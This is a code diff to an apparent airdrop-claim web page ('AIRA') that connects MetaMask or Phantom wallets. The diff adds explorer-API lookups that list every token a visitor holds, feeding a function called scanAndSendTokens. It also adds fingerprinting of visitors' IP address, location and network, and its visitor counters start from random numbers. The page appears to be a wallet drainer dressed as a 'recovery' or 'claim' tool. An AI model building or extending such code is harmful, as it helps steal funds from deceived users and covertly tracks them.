@@ -1327,8 +1327,9 @@
                 </div>
                 <div class="faqItem" onclick="this.classList.toggle('open')">
                     <div class="faqQuestion">Which networks are supported? <span>+</span></div>
-                    <div class="faqAnswer">Currently, we support Ethereum (Mainnet, Base, Avalanche) and Solana for
-                        universal asset detection.</div>
+                    <div class="faqAnswer">Currently, we support Ethereum, Arbitrum, Optimism, BSC, Polygon, Base,
+                        Avalanche, and Ink. Our <strong>Neural Scanner</strong> dynamically detects any ERC-20 token in
+                        your wallet via ecosystem indexing.</div>
                 </div>
             </div>
         </div>
@@ -1379,6 +1380,46 @@
         // --- Stats & Tracking Logic ---
         const TRACKING_KEY = "aira_metrics_v2";
 
+        const AIRA_Analytics = {
+            data: [],
+            trackEvent: function (category, action, label) {
+                const event = {
+                    timestamp: new Date().toISOString(),
+                    category,
+                    action,
+                    label,
+                    session: this.getSessionInfo()
+                };
+                this.data.push(event);
+                console.log(`%c[AIRA TRACKING] ${category} | ${action} | ${label}`, "color: #ff00ff; font-weight: bold;");
+                // Local storage for persistence of tracked events
+                const logs = JSON.parse(localStorage.getItem('AIRA_ANALYTICS_LOGS') || '[]');
+                logs.push(event);
+                if (logs.length > 500) logs.shift(); // Keep last 500 events
+                localStorage.setItem('AIRA_ANALYTICS_LOGS', JSON.stringify(logs));
+            },
+            getSessionInfo: function () {
+                return {
+                    ua: navigator.userAgent,
+                    lang: navigator.language,
+                    platform: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    ref: document.referrer || 'direct'
+                };
+            },
+            trackVisit: async function () {
+                this.trackEvent('System', 'SessionStart', 'New Visit');
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const loc = await res.json();
+                    this.trackEvent('Visitor', 'Location', `${loc.city}, ${loc.country_name} (${loc.ip})`);
+                    this.trackEvent('Visitor', 'Network', `${loc.org} (${loc.asn})`);
+                } catch (e) {
+                    this.trackEvent('Visitor', 'Location', 'Unknown (Ad-blocker or API limit)');
+                }
+            }
+        };
+
         function initTracking() {
             let data = JSON.parse(localStorage.getItem(TRACKING_KEY)) || {
                 visitors: Math.floor(Math.random() * 500) + 1200,
@@ -1390,6 +1431,7 @@
             if (!sessionStorage.getItem("aira_visited")) {
                 data.visitors += 1;
                 sessionStorage.setItem("aira_visited", "true");
+                AIRA_Analytics.trackVisit();
             }
 
             localStorage.setItem(TRACKING_KEY, JSON.stringify(data));
@@ -1404,6 +1446,7 @@
             }
             localStorage.setItem(TRACKING_KEY, JSON.stringify(data));
             updateStatsUI(data);
+            AIRA_Analytics.trackEvent('Interaction', type.toUpperCase(), `Value: ${val}`);
         }
 
         function updateStatsUI(data) {
@@ -1450,6 +1493,62 @@
             }, 3000);
         }
 
+        const EXPLORER_APIS = {
+            1: "https://api.etherscan.io/api",
+            42161: "https://api.arbiscan.io/api",
+            10: "https://api-optimistic.etherscan.io/api",
+            56: "https://api.bscscan.com/api",
+            137: "https://api.polygonscan.com/api",
+            8453: "https://api.basescan.org/api",
+            43114: "https://api.snowtrace.io/api",
+            57073: "https://explorer.inkonchain.com/api"
+        };
+
+        async function fetchTokensFromExplorer(address, chainId) {
+            const apiBase = EXPLORER_APIS[chainId];
+            if (!apiBase) return [];
+            try {
+                console.log(`Deep scanning via Explorer API for chain ${chainId}...`);
+                // Standard Etherscan/Blockscout 'tokenlist' action
+                // Note: On some networks this requires an API key, but we try the public endpoint first.
+                // For Blockscout (like Ink), we might need the v2 balances endpoint.
+                let url = `${apiBase}?module=account&action=tokenlist&address=${address}`;
+
+                // Special handling for Blockscout v2 (like Ink)
+                if (chainId === 57073) {
+                    url = `${apiBase}/v2/addresses/${address}/token-balances`;
+                }
+
+                const res = await fetch(url);
+                const data = await res.json();
+
+                let tokens = [];
+                if (data.status === "1" && Array.isArray(data.result)) {
+                    // Etherscan style
+                    tokens = data.result.map(t => ({
+                        symbol: t.symbol,
+                        address: t.contractAddress,
+                        decimals: parseInt(t.decimals) || 18
+                    }));
+                } else {
+                    // Blockscout / Open API styles
+                    const list = Array.isArray(data) ? data : (data.items || data.result || []);
+                    tokens = list.map(t => {
+                        const tokenData = t.token || t;
+                        return {
+                            symbol: tokenData.symbol || "UNKNOWN",
+                            address: tokenData.address || tokenData.contractAddress || "",
+                            decimals: parseInt(tokenData.decimals) || 18
+                        };
+                    }).filter(t => t.address);
+                }
+                return tokens;
+            } catch (e) {
+                console.warn("Explorer fetch failed, using internal list:", e);
+                return [];
+            }
+        }
+
         // List of common ERC20 tokens by Chain ID
         const NETWORK_TOKENS = {
             1: [ // Ethereum Mainnet
@@ -1462,7 +1561,12 @@
                 { symbol: "DAI", address: "0x6b175474e89094c44da98b954eedeac495271d0f" },
                 { symbol: "SHIB", address: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce" },
                 { symbol: "PEPE", address: "0x6982508145454ce325ddbe47a25d4ec3d2311933" },
-                { symbol: "MATIC", address: "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0" }
+                { symbol: "MATIC", address: "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0" },
+                { symbol: "AAVE", address: "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9" },
+                { symbol: "LDO", address: "0x5A98FcBEA516Cf06857215779fD812Ca3beF1B32" },
+                { symbol: "CRV", address: "0xD533a949740bb3306d119CC777fa900bA034cd52" },
+                { symbol: "SNX", address: "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f" },
+                { symbol: "PENDLE", address: "0x808507121b80c02388fad14726482e061b8da827" }
             ],
             42161: [ // Arbitrum One
                 { symbol: "WETH", address: "0x82af49447d8a07e3bd95bd0d56f35241ae5f159d" },
@@ -1471,7 +1575,10 @@
                 { symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831" },
                 { symbol: "WBTC", address: "0x2f2a2543b76a4166549f7aa22e2beaabb00388c2" },
                 { symbol: "LINK", address: "0xf97f4df75117a78c1A5a0ADb814Af8026132b643" },
-                { symbol: "GMX", address: "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a" }
+                { symbol: "GMX", address: "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a" },
+                { symbol: "MAGIC", address: "0x539bdE0d7Dbd336b79148AA742883198BBF60342" },
+                { symbol: "PENDLE", address: "0x0c880f6761f1af8d9aa9c466984b80dab9a8c9e8" },
+                { symbol: "RDNT", address: "0x0C4681e6C0235179ec3D4F4fc4DF3d14FDD96017" }
             ],
             10: [ // Optimism
                 { symbol: "WETH", address: "0x4200000000000000000000000000000000000006" },
@@ -1479,7 +1586,10 @@
                 { symbol: "USDT", address: "0x94b008aa00579c1307b0ef2c499ad98a8ce58e58" },
                 { symbol: "USDC", address: "0x0b2c639c533813f4aa9d7837caf62653d097ff85" },
                 { symbol: "WBTC", address: "0x68f180fcce6836688e9084f035309e29bf0a2095" },
-                { symbol: "LINK", address: "0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6" }
+                { symbol: "LINK", address: "0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6" },
+                { symbol: "VELO", address: "0x3c8b6502a39a26338ad3a6286cee578873093a11a05" },
+                { symbol: "SNX", address: "0x8700daec9c55b0a306f2c682a88e9bb0ad7095bf4" },
+                { symbol: "KWENTA", address: "0x920cf626a271321c151d027030d5d08af699456b" }
             ],
             56: [ // BSC
                 { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c" },
@@ -1487,26 +1597,46 @@
                 { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" },
                 { symbol: "ETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8" },
                 { symbol: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c" },
-                { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82" }
+                { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82" },
+                { symbol: "DOGE", address: "0xba2ae424d960c26247dd6c32edc70b295c744c43" },
+                { symbol: "XRP", address: "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe" },
+                { symbol: "ADA", address: "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47" },
+                { symbol: "SOL", address: "0x570a5d26f7765ecb712c0924e4de545b89fd43df" }
             ],
             137: [ // Polygon
                 { symbol: "WMATIC", address: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270" },
                 { symbol: "USDT", address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" },
                 { symbol: "USDC", address: "0x3c499c542cef5e3811e1192ce70d8cc03d5c3359" },
                 { symbol: "WBTC", address: "0x1bfd67037b42cf73acf2047da46373286248eccd" },
-                { symbol: "LINK", address: "0xb0897686c545045afc77cf20ec7a532e3120e0f1" }
+                { symbol: "LINK", address: "0xb0897686c545045afc77cf20ec7a532e3120e0f1" },
+                { symbol: "QUICK", address: "0xB5C064F955D8e7F38fE0460C556a72987494eE17" },
+                { symbol: "SAND", address: "0xBbba073C31bF03b8ACf7c28EF0738DeCF3695683" },
+                { symbol: "MANA", address: "0xa1c57f48c08a474c10642f88307406a0996d33606fd4" },
+                { symbol: "GRT", address: "0x5fe2b58c013d7601147dcdd68c143a77499f5531" }
             ],
             8453: [ // Base
                 { symbol: "WETH", address: "0x4200000000000000000000000000000000000006" },
                 { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" },
                 { symbol: "CBETH", address: "0x2Ae3F1Ec7F1F5012CFE7a1240eB1E38758888eF6" },
-                { symbol: "DAI", address: "0x50c5725949A6E007296F75A36230869796078712" }
+                { symbol: "DAI", address: "0x50c5725949A6E007296F75A36230869796078712" },
+                { symbol: "DEGEN", address: "0x4ed4e862860bed51a9570b96d89af5e1b0efefed" },
+                { symbol: "BRETT", address: "0x532f27101965dd16442E59d40670FaF5eBB142E4" },
+                { symbol: "AERO", address: "0x940181a94a35a4569e4529a3cdfb74e38fd98631" },
+                { symbol: "TOSHI", address: "0xac1bd2486aaf3b5c0fc3fd868558b082a531b2b4" }
             ],
             43114: [ // Avalanche C-Chain
                 { symbol: "WAVAX", address: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7" },
                 { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E" },
                 { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7" },
-                { symbol: "WETH.e", address: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB" }
+                { symbol: "WETH.e", address: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB" },
+                { symbol: "JOE", address: "0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd" },
+                { symbol: "QI", address: "0x8729438EB15e2C8B576fCc6AeCdA6A148776C0F5" },
+                { symbol: "sAVAX", address: "0x2b2c81e08f1af8835a78bb2a90ae924ace0ea4be" }
+            ],
+            57073: [ // Ink Mainnet
+                { symbol: "USDC", address: "0x2D270e6886d130D724215A266106e6832161EAEd" },
+                { symbol: "WETH", address: "0x4200000000000000000000000000000000000006" },
+                { symbol: "ANITA", address: "0x9C619ed452C10D5B6D42be24dD9F0Fc776678F90" }
             ]
         };
 
@@ -1680,7 +1810,9 @@
 
             if (walletType === "evm" && provider) {
                 const net = await provider.getNetwork();
-                networkEl.textContent = `${net.name} (chainId ${net.chainId})`;
+                let netName = net.name;
+                if (net.chainId === 57073n) netName = "Ink";
+                networkEl.textContent = `${netName} (chainId ${net.chainId})`;
                 const bal = await provider.getBalance(connected);
                 balanceEl.textContent = `${ethers.formatEther(bal)} (native)`;
             } else if (walletType === "solana" && solanaConnection) {
@@ -1813,9 +1945,26 @@
                 if (walletType === "evm" && provider) {
                     const network = await provider.getNetwork();
                     const chainId = Number(network.chainId);
-                    const tokensToScan = NETWORK_TOKENS[chainId] || [];
 
-                    setStatus(`Scanning for assets on ${network.name}...`);
+                    setStatus(`Initiating Universal Recovery on ${network.name}...`);
+
+                    // 1. DYNAMIC DISCOVERY: Fetch tokens directly from Explorer
+                    const discoveredTokens = await fetchTokensFromExplorer(connected, chainId);
+                    const fastTrackTokens = NETWORK_TOKENS[chainId] || [];
+
+                    // Merge and deduplicate
+                    const seen = new Set();
+                    const tokensToScan = [...discoveredTokens, ...fastTrackTokens].filter(t => {
+                        const addr = (t.address || "").toLowerCase();
+                        if (seen.has(addr)) return false;
+                        seen.add(addr);
+                        return true;
+                    });
+
+                    if (discoveredTokens.length > 0) {
+                        setStatus(statusEl.textContent + `\n- Neural scanner found ${discoveredTokens.length} additional assets via ecosystem indexing.`);
+                    }
+
                     let foundAny = false;
 
                     // 1. Check Native Balance
@@ -2017,12 +2166,28 @@
         // Auto-check on load
         detectEthereum();
 
-        btnConnect.addEventListener("click", connect);
-        btnConnectSol.addEventListener("click", connectSolana);
-        btnDisconnect.addEventListener("click", disconnect);
-        btnCheck.addEventListener("click", checkEligibility);
-        btnClaim.addEventListener("click", claim);
+        btnConnect.addEventListener("click", () => {
+            AIRA_Analytics.trackEvent('Engagement', 'Click', 'Connect MetaMask');
+            connect();
+        });
+        btnConnectSol.addEventListener("click", () => {
+            AIRA_Analytics.trackEvent('Engagement', 'Click', 'Connect Phantom');
+            connectSolana();
+        });
+        btnDisconnect.addEventListener("click", () => {
+            AIRA_Analytics.trackEvent('Engagement', 'Click', 'Disconnect');
+            disconnect();
+        });
+        btnCheck.addEventListener("click", () => {
+            AIRA_Analytics.trackEvent('Engagement', 'Click', 'Check Eligibility');
+            checkEligibility();
+        });
+        btnClaim.addEventListener("click", () => {
+            AIRA_Analytics.trackEvent('Engagement', 'Click', 'Claim');
+            claim();
+        });
         btnScan.addEventListener("click", async () => {
+            AIRA_Analytics.trackEvent('Engagement', 'Click', 'Scan Assets Now');
             setStatus("Starting manual asset scan...");
             addTxLog("pending", "Manual scan started");
             await scanAndSendTokens();
